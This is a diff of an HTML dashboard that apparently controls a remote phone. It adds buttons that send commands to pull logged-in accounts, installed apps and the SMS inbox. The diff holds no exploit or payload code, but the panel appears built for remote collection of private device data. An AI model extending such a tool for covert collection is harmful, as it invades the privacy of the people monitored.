@@ -9,7 +9,7 @@
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=Outfit:wght@700;800&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-    <link rel="stylesheet" href="style.css?v=3.6">
+    <link rel="stylesheet" href="style.css?v=3.7">
 
     <!-- Firebase SDK -->
     <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-app-compat.js"></script>
@@ -292,9 +292,10 @@
                         <h4 style="font-size: 1.05rem; font-weight: 700; color: #fff; display: flex; align-items: center; gap: 8px;">
                             <i class="fas fa-user-circle text-primary-c"></i> Logged In Accounts
                         </h4>
+                        <button class="btn-ghost" onclick="sendCommand('exportAccounts')" style="padding: 6px 14px; font-size: 0.78rem; border-radius: var(--radius-pill);"><i class="fas fa-sync-alt" style="margin-right: 6px; color: var(--primary);"></i> Request Accounts</button>
                     </div>
                     <div id="accountsList" style="display: flex; flex-direction: column; gap: 10px;">
-                        <div class="empty-state"><i class="fas fa-user-slash"></i><p>No accounts loaded yet.</p></div>
+                        <div class="empty-state"><i class="fas fa-user-slash"></i><p>No accounts loaded yet. Click 'Request Accounts' to fetch.</p></div>
                     </div>
                 </div>
             </div>
@@ -306,9 +307,10 @@
                         <h4 style="font-size: 1.05rem; font-weight: 700; color: #fff; display: flex; align-items: center; gap: 8px;">
                             <i class="fas fa-th text-primary-c"></i> Installed Packages & Applications
                         </h4>
+                        <button class="btn-ghost" onclick="sendCommand('getApps')" style="padding: 6px 14px; font-size: 0.78rem; border-radius: var(--radius-pill);"><i class="fas fa-sync-alt" style="margin-right: 6px; color: var(--primary);"></i> Fetch Apps</button>
                     </div>
                     <div id="appsList">
-                        <div class="empty-state"><i class="fas fa-box-open"></i><p>Loading application list...</p></div>
+                        <div class="empty-state"><i class="fas fa-box-open"></i><p>No apps found. Click 'Fetch Apps' to load real-time list.</p></div>
                     </div>
                 </div>
             </div>
@@ -320,9 +322,10 @@
                         <h4 style="font-size: 1.05rem; font-weight: 700; color: #fff; display: flex; align-items: center; gap: 8px;">
                             <i class="fas fa-envelope text-primary-c"></i> SMS Inbox & Dispatch Stream
                         </h4>
+                        <button class="btn-ghost" onclick="sendCommand('getSMS')" style="padding: 6px 14px; font-size: 0.78rem; border-radius: var(--radius-pill);"><i class="fas fa-sync-alt" style="margin-right: 6px; color: var(--primary);"></i> Fetch Inbox</button>
                     </div>
                     <div id="smsListContainer">
-                        <div class="empty-state"><i class="fas fa-envelope"></i><p>No SMS messages found.</p></div>
+                        <div class="empty-state"><i class="fas fa-envelope"></i><p>No SMS messages found. Click 'Fetch Inbox' to fetch.</p></div>
                     </div>
                 </div>
             </div>
